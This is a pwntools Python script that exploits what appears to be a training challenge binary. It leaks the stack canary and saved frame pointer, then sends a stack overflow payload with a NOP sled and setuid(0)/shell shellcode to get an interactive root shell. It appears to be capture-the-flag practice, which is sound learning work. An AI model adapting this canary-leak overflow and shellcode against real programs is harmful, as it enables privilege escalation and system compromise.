from pwn import *


conn = process('/challenge/toddlerone-level-4-0')

conn.recvuntil(b'size: ')
offset_canary = 40
conn.sendline(str(offset_canary+1).encode())

conn.recvuntil(b'bytes)!\n')
payload = b'aREPEATb' + b'A' * (offset_canary+1-8)
conn.send(payload)

print(conn.recvuntil(payload))

canary = u64(conn.recv(7).rjust(8, b'\x00'))
print(f'canary: {hex(canary)}')

rbp = u64(conn.recvline(False).ljust(8, b'\x00'))
print(f'rbp: {hex(rbp)}')

# Exploit
context.arch = 'amd64'
shellcode = asm(shellcraft.setuid(0)) + asm(shellcraft.sh())
cookie = 0x7a63521e6deaa1b4 # static canary (canary also called cookie)
payload = b'A' * (32) + p64(cookie) + p64(canary) + b'B' * 8 + p64(rbp) + b'\x90' * 5000 + shellcode

conn.recvuntil(b'size: ')
size = len(payload)
conn.sendline(str(size).encode())

conn.recvuntil(b'bytes)!\n')
conn.send(payload)

conn.interactive()
